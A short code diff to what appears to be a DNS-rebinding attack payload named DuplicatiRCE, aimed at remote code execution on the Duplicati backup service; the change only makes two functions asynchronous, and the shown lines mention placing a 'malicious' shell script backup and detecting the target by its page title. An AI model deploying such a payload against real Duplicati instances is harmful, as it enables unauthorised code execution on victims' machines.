@@ -24,7 +24,7 @@ Sample script:
 
 */
 
-const DuplicatiRCE = () => {
+const DuplicatiRCE = async () => {
 
     /*   Insert the location of your backup of a "malicious" shell script below.
 "FTP, SSH, WebDAV as well as popular services like Microsoft OneDrive, 
@@ -191,7 +191,7 @@ Amazon Cloud Drive & S3, Google Drive, box.com, Mega, hubiC and many others
 
     // Invoked to determine to detect whether the rebinded service
     // is the one targetted by this payload. Must return true or false.
-    function isService(headers, cookie, body) {
+    async function isService(headers, cookie, body) {
         // We do not check for version in this example
         let detected = false;
         if ((body.includes('<title>Backup</title>') &&
